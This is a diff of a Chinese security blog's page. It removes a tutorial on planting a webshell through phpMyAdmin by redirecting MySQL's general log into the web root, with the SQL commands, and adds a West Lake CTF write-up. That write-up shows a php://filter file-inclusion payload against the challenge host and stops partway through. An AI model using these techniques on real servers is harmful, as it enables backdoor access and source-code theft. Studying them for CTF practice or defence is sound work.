@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="php myadmin," />
+  <meta name="keywords" content="CTF,文件包含,目录遍历," />
 
 
 
@@ -79,25 +79,23 @@
 
 
 
-<meta name="description" content="有时候在渗透测试过程中 我们会得到php myadmin 的账号和密码 既然登陆了php myadmin 就可以用php myadmin 来get shell。  具体内容">
-<meta name="keywords" content="php myadmin">
+<meta name="description" content="西湖论剑的题目 前些天没有做 今天西湖论剑的题目重新放了出来 可以复现了 故来做一下web题目 题目质量较高">
+<meta name="keywords" content="CTF,文件包含,目录遍历">
 <meta property="og:type" content="article">
-<meta property="og:title" content="php myadmin写shell">
-<meta property="og:url" content="http://yoursite.com/2018/08/26/php myadminдshell/index.html">
+<meta property="og:title" content="西湖论剑web 3题 解析">
+<meta property="og:url" content="http://yoursite.com/2019/04/11/西湖论剑web-3题-解析/index.html">
 <meta property="og:site_name" content="书生 - Blog">
-<meta property="og:description" content="有时候在渗透测试过程中 我们会得到php myadmin 的账号和密码 既然登陆了php myadmin 就可以用php myadmin 来get shell。  具体内容">
+<meta property="og:description" content="西湖论剑的题目 前些天没有做 今天西湖论剑的题目重新放了出来 可以复现了 故来做一下web题目 题目质量较高">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2018/08/26/php%20myadminдshell/php%20myadmin写shell/1.png">
-<meta property="og:image" content="http://yoursite.com/2018/08/26/php%20myadminдshell/php%20myadmin写shell/2.png">
-<meta property="og:image" content="http://yoursite.com/2018/08/26/php%20myadminдshell/php%20myadmin写shell/3.png">
-<meta property="og:image" content="http://yoursite.com/2018/08/26/php%20myadminдshell/php%20myadmin写shell/4.png">
-<meta property="og:image" content="http://yoursite.com/2018/08/26/php%20myadminдshell/php%20myadmin写shell/5.png">
-<meta property="og:image" content="http://yoursite.com/2018/08/26/php%20myadminдshell/php%20myadmin写shell/6.png">
-<meta property="og:updated_time" content="2018-12-27T13:36:10.000Z">
+<meta property="og:image" content="https://i.loli.net/2019/04/11/5caf00c571680.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/11/5caf012737d97.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/11/5caf025fce103.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/11/5caf03a35ecf1.jpg">
+<meta property="og:updated_time" content="2019-04-11T09:21:27.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="php myadmin写shell">
-<meta name="twitter:description" content="有时候在渗透测试过程中 我们会得到php myadmin 的账号和密码 既然登陆了php myadmin 就可以用php myadmin 来get shell。  具体内容">
-<meta name="twitter:image" content="http://yoursite.com/2018/08/26/php%20myadminдshell/php%20myadmin写shell/1.png">
+<meta name="twitter:title" content="西湖论剑web 3题 解析">
+<meta name="twitter:description" content="西湖论剑的题目 前些天没有做 今天西湖论剑的题目重新放了出来 可以复现了 故来做一下web题目 题目质量较高">
+<meta name="twitter:image" content="https://i.loli.net/2019/04/11/5caf00c571680.jpg">
 
 
 
@@ -127,13 +125,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/08/26/php myadminдshell/"/>
+  <link rel="canonical" href="http://yoursite.com/2019/04/11/西湖论剑web-3题-解析/"/>
 
 
 
 
 
-  <title>php myadmin写shell | 书生 - Blog</title>
+  <title>西湖论剑web 3题 解析 | 书生 - Blog</title>
   
 
 
@@ -310,7 +308,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/26/php myadminдshell/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/11/西湖论剑web-3题-解析/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="scholar(书生)">
@@ -327,7 +325,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">php myadmin写shell</h1>
+          <h1 class="post-title" itemprop="name headline">西湖论剑web 3题 解析</h1>
         
 
         <div class="post-meta">
@@ -339,8 +337,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-26T16:34:25+08:00">
-                2018-08-26
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-11T16:41:36+08:00">
+                2019-04-11
               </time>
             
 
@@ -362,8 +360,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web安全/" itemprop="url" rel="index">
-                    <span itemprop="name">web安全</span>
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
                   </a>
                 </span>
 
@@ -399,26 +397,26 @@
       
 
       
-        <p>有时候在渗透测试过程中 我们会得到php myadmin 的账号和密码 既然登陆了php myadmin 就可以用php myadmin 来get shell。 </p>
-<h2 id="具体内容"><a href="#具体内容" class="headerlink" title="具体内容"></a>具体内容</h2><p><img src="/2018/08/26/php myadminдshell/php myadmin写shell/1.png" alt=""></p>
-  <a id="more"></a> 
-<h3 id="简单说明"><a href="#简单说明" class="headerlink" title="简单说明"></a>简单说明</h3><p>登陆进php myadmin 有些朋友可能会直接选择去写入一个webshell 执行后会弹出大概无法写入的意思 这里和php myadmin的设置有关系 在实战情况下一般都不能直接去写入一个shell的。</p>
-<p>这时候我们需要换个思路</p>
-<h3 id="利用mysql-错误日志写入一句话"><a href="#利用mysql-错误日志写入一句话" class="headerlink" title="利用mysql 错误日志写入一句话"></a>利用mysql 错误日志写入一句话</h3><p>这里需要先设置 general log (日志保存状态)general log file(日志保存路径)</p>
-<p>先执行</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'general%'</span> a</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/08/26/php myadminдshell/php myadmin写shell/2.png" alt=""></p>
-<p>我们需要把general log 改为ON 也就是打开状态</p>
-<p>还要把general log file路径改为网站的根目录</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> global general_log = <span class="string">"ON"</span>; </span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> global <span class="attribute">general_log_file</span>=<span class="string">'D:/stduy/PHPTutorial/WWW/infos.php'</span>;</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/08/26/php myadminдshell/php myadmin写shell/3.png" alt=""></p>
-<p>执行完后因为我是本地搭建环境所以可以看到成功创建了</p>
-<p><img src="/2018/08/26/php myadminдshell/php myadmin写shell/4.png" alt=""></p>
-<p>现在我们只需要输入一个错误的sql语句即可 这里我写入一句话 可以看到一句话已经存在于infos.php里面了</p>
-<p><img src="/2018/08/26/php myadminдshell/php myadmin写shell/5.png" alt=""></p>
-<p>之后我们菜刀直接链接即可</p>
-<p><img src="/2018/08/26/php myadminдshell/php myadmin写shell/6.png" alt=""></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>网上有许多相关的文章 不过自己写一遍印象才会更深刻吧</p>
+        <p>西湖论剑的题目 前些天没有做 今天西湖论剑的题目重新放了出来 可以复现了</p>
+<p>故来做一下web题目 题目质量较高</p>
+<p><img src="https://i.loli.net/2019/04/11/5caf00c571680.jpg" alt="Xnip2019-04-11_16-54-10.jpg"></p>
+<a id="more"></a>
+<h2 id="babyt3"><a href="#babyt3" class="headerlink" title="babyt3"></a>babyt3</h2><p><img src="https://i.loli.net/2019/04/11/5caf012737d97.jpg" alt="Xnip2019-04-11_16-55-57.jpg"></p>
+<p>打开题目连接 看到一个类似博客界面 都不是重点 重点是看到了</p>
+<p><code>include $_GET[&#39;file&#39;]</code></p>
+<p>看到这突然想到题目考查的应该是文件包含相关知识</p>
+<p>故试一下</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">61.164</span><span class="number">.47</span><span class="number">.198</span>:<span class="number">10000</span>/?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">convert</span>.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/04/11/5caf025fce103.jpg" alt="Xnip2019-04-11_17-01-08.jpg"></p>
+<p>两端base64加密的内容 第一段为index.php加密后的内容</p>
+<p>base解密后为</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$a = @$_GET[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!$a) &#123;</span></span><br><span class="line"><span class="php">	$a = <span class="string">'./templates/index.html'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'include $_GET[\'file\']'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (strpos(<span class="string">'flag'</span>,$a)!==<span class="keyword">false</span>) &#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">die</span>(<span class="string">'nonono'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> $a;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--hint: ZGlyLnBocA== --&gt;</span></span><br></pre></td></tr></table></figure>
+<p>貌似用处不大 不过第二段的<code>&lt;!--hint: ZGlyLnBocA== --&gt;</code></p>
+<p>解密后为<code>dir.php</code></p>
+<p>访问一下</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//61.164.47.198:10000/dir.php</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/04/11/5caf03a35ecf1.jpg" alt="Xnip2019-04-11_17-06-33.jpg"></p>
+<p>接下来利用文件包含 包含<code>dir.php</code>这个文件</p>
 
       
     </div>
@@ -436,7 +434,11 @@
       
         <div class="post-tags">
           
-            <a href="/tags/php-myadmin/" rel="tag"><i class="fa fa-tag"></i> php myadmin</a>
+            <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+          
+            <a href="/tags/文件包含/" rel="tag"><i class="fa fa-tag"></i> 文件包含</a>
+          
+            <a href="/tags/目录遍历/" rel="tag"><i class="fa fa-tag"></i> 目录遍历</a>
           
         </div>
       
@@ -449,8 +451,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/08/09/渗透某企业/" rel="next" title="渗透某企业">
-                <i class="fa fa-chevron-left"></i> 渗透某企业
+              <a href="/2019/04/01/南邮CG-CTF/" rel="next" title="南邮CG-CTF">
+                <i class="fa fa-chevron-left"></i> 南邮CG-CTF
               </a>
             
           </div>
@@ -458,10 +460,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/10/29/Python学习笔记/" rel="prev" title="Python学习笔记">
-                Python学习笔记 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -645,7 +643,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#具体内容"><span class="nav-number">1.</span> <span class="nav-text">具体内容</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#简单说明"><span class="nav-number">1.1.</span> <span class="nav-text">简单说明</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用mysql-错误日志写入一句话"><span class="nav-number">1.2.</span> <span class="nav-text">利用mysql 错误日志写入一句话</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">1.3.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#babyt3"><span class="nav-number">1.</span> <span class="nav-text">babyt3</span></a></li></ol></div>
             
 
           </div>
